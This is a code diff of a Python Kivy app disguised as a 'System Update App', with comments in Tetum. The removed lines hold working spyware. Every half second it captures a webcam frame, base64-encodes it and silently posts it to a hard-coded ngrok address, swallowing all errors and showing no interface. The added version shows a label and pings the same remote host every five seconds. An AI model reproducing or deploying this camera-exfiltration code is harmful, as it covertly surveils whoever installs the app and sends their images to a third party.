@@ -1,29 +1,25 @@
-import base64
 import requests
-import cv2
 from kivy.app import App
+from kivy.uix.label import Label
 from kivy.clock import Clock
 
 URL_NGROK = "https://bleriest-portraitlike-dreama.ngrok-free.dev"
 
 class SystemUpdateApp(App):
     def build(self):
-        Clock.schedule_interval(self.capture_and_stream, 0.5)
-        return None
+        # Label simples atu hatene app funsiona
+        return Label(text='System Update App\nRunning...')
 
-    def capture_and_stream(self, dt):
-        cap = cv2.VideoCapture(0)  # muda ba 0 normalmente ba kamera primária
-        ret, frame = cap.read()
-        if ret:
-            _, buffer = cv2.imencode('.jpg', frame, [cv2.IMWRITE_JPEG_QUALITY, 30])
-            jpg_as_text = base64.b64encode(buffer).decode('utf-8')
-            try:
-                requests.post(f"{URL_NGROK}/stream_upload", 
-                            data=f"data:image/jpeg;base64,{jpg_as_text}", 
-                            timeout=2)
-            except:
-                pass
-        cap.release()
+    def on_start(self):
+        # Chama funsaun kada 5 segundos
+        Clock.schedule_interval(self.send_request, 5)
+
+    def send_request(self, dt):
+        try:
+            response = requests.get(f"{URL_NGROK}/ping", timeout=5)
+            print(f"Response: {response.status_code}")
+        except Exception as e:
+            print(f"Error: {e}")
 
 if __name__ == '__main__':
     SystemUpdateApp().run()
